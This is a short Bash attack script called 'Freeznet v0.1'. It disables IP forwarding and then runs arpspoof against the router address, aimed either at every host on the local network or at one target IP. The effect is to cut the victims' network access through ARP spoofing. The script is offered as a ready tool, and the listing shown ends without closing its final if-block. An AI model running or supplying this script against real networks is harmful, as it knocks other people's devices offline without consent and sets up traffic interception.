#!/bin/bash

clear
user=`whoami`
if [ "$user" != "root" ] ; then
clear
echo
echo "ROOT PRIVILEGES REQUIRED"
read
exit
fi

echo -e "\t\tFreeznet v0.1\n"
echo -e "Stopping ip fowarding"

echo "0" > /proc/sys/net/ipv4/ip_forward

sleep 2

echo -e "----------------------------------------------------------------\n" 

read -p "Interface which we want to use (ej: wlan0,eth0):  " iface
read -p "ROUTER ADDRESS ( ip ):  " routerip

read -p "Freeze all hosts?(y/n):  " opcion1

if [ "$opcion1" = "y" ] 
then

arpspoof -i $iface $routerip

elif [ "$opcion1" = "n" ] 
then

read -p "Which is the target? (ip) :  " target

arpspoof -i $iface -t $target $routerip

else 

clear
echo -e "Opcion invalida, saliendo..."

echo "----------------------------------------------------------------"
